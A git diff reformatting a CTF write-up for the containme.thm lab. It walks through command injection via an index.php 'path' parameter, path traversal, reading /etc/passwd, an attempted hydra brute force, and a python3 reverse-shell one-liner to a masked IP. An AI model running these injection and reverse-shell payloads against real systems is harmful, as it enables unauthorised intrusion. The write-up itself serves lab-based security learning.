@@ -109,16 +109,16 @@ Task Completed
 
 <br>
 <br>
-<h2 align="center">containme.thm/info.php</h2>
-<p align="center">PHP Version, VARS and much more</em></p>
-
-<br>
-<br>
-
-<h2 align="center">containme.thm/index.php</h2>
-<p align="center">directory listing<br><em>--  where is the <code>path</code> ?  --</em><br>recalled nikto´s output<br></p>
+<h2 align="center">info.php</h2>
+<p align="center">containme.thm/info.php<br>PHP Version, VARS and much more</em></p>
 
 <img width="1127" height="733" alt="image" src="https://github.com/user-attachments/assets/69c2e8cf-c9fa-441b-a788-f42a9f2e8008" />
+
+<br>
+<br>
+
+<h2 align="center">index.php</h2>
+<p align="center">containme.thm/index.php<br>directory listing<br><em>--  where is the <code>path</code> ?  --</em><br>recalled nikto´s output<br></p>
 
 <br>
 <br>
@@ -131,48 +131,50 @@ Task Completed
 path                           [Status: 200, Size: 1240, Words: 328, Lines: 34]
 ```
 
-<h2 align="center">Command Execution<br><br>containme.thm/index.php?<code>path</code>=/</h2>
+<h2 align="center">Command Execution</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/</p>
 
 <img width="1125" height="402" alt="image" src="https://github.com/user-attachments/assets/0c066125-375d-4f12-814c-4fc51e14ff4b" />
 
 <br>
 <br>
-<h2 align="center">hostname<br><br>containme.thm/index.php?<code>path</code>=/hostname</h2>
-<p align="center">host1</p>
+<h2 align="center">hostname</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/hostname<br>host1</p>
 
 <img width="1130" height="343" alt="image" src="https://github.com/user-attachments/assets/b8cdca21-272f-496c-abac-8571e2c6243d" />
 
 <br>
 <br>
-<h2 align="center">id<br><br>containme.thm/index.php?<code>path</code>=/id</h2>
-<p align="center">uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
+<h2 align="center">id</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
 
 <img width="1125" height="229" alt="image" src="https://github.com/user-attachments/assets/d6f98967-76a9-4587-b9b4-6bdb8bf31a78" />
 
 <br>
 <br>
-<h2 align="center">pwd<br><br>containme.thm/index.php?<code>path</code>=/pwd</h2>
-<p align="center">/var/www/html</p>
+<h2 align="center">pwd</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/pwd<br>/var/www/html</p>
 
 <img width="1127" height="217" alt="image" src="https://github.com/user-attachments/assets/01089e3c-d006-48f6-9f4e-78f74f0238a5" />
 
 <br>
 <br>
-<h2 align="center">python3<br><br>containme.thm/index.php?<code>path</code>=/which python3</h2>
-<p align="center">🤔<br>/usr/bin/python3</p>
+<h2 align="center">python3</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/which python3<br>🤔<br>/usr/bin/python3</p>
 
 <img width="1129" height="223" alt="image" src="https://github.com/user-attachments/assets/48bcffb4-f289-42e4-8a0d-b29ea3dae000" />
 
 <br>
 <br>
-<h2 align="center">home´s content<br><br>containme.thm/index.php?<code>path</code>=/home/</h2>
-<p align="center">👤 mike</p>
+<h2 align="center">home´s content</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/home/<br>👤 mike</p>
 
 <img width="1127" height="252" alt="image" src="https://github.com/user-attachments/assets/16a47200-12da-4077-b4b5-1a182a4fbd26" />
 
 <br>
 <br>
-<h2 align="center">mike´s content<br><br>containme.thm/index.php?<code>path</code>=/home/mike/</h2>
+<h2 align="center">mike´s content</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=/home/mike/</p>
 
 <img width="1132" height="265" alt="image" src="https://github.com/user-attachments/assets/78285156-06ca-427f-96fe-b7b4bea86730" />
 
@@ -181,21 +183,22 @@ path                           [Status: 200, Size: 1240, Words: 328, Lines: 34]
 <p align="center">After discovering the previous contents, I tried guessing 👤 mike´s password using hydra against port 22 and 8022; unsuccessfully.</p>
 <br>
 <br>
-<h2 align="center">Backtracking<br><br>containme.thm/index.php?<code>path</code>=../../../</h2>
-<p align="center">recalled nikto´s output<br><br>😱</p>
+<h2 align="center">Backtracking</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=../../../<br>recalled nikto´s output<br><br>😱</p>
 
 <img width="1127" height="434" alt="image" src="https://github.com/user-attachments/assets/fa11e88e-d59d-4dec-9745-957740d959a3" />
 
 <br>
 <br>
-<h2 align="center">users<br><br>containme.thm/index.php?<code>path</code>=<code>|</code> cat /etc/passwd | grep bash</h2>
-<p align="center">Recalled nikto´s output<br>used <code>|</code> successfully<br>discovered root and mike<br>note: don´t forget the space after <code>|</code></p>
+<h2 align="center">users</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=<code>|</code> cat /etc/passwd | grep bash<br>Recalled nikto´s output<br>used <code>|</code> successfully<br>discovered root and mike<br>note: don´t forget the space after <code>|</code></p>
 
 <img width="1127" height="179" alt="image" src="https://github.com/user-attachments/assets/568eda5a-b843-458e-8b0f-417ad5dc2302" />
 
 <br>
 <br>
-<h2 align="center">Shell as www-data in host 1<br><br>containme.thm/index.php?<code>path</code>=<code>|</code> python3 -c<br> 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect(("xx.xxx.xxx.xx",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</h2>
+<h2 align="center">Shell as www-data in host 1</h2>
+<p align="center">containme.thm/index.php?<code>path</code>=<code>|</code> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xxx.xx",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);<br>os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</p>
 
 <img width="1132" height="153" alt="image" src="https://github.com/user-attachments/assets/ec431316-1377-4d93-87cb-e8ced1803e8b" />
 
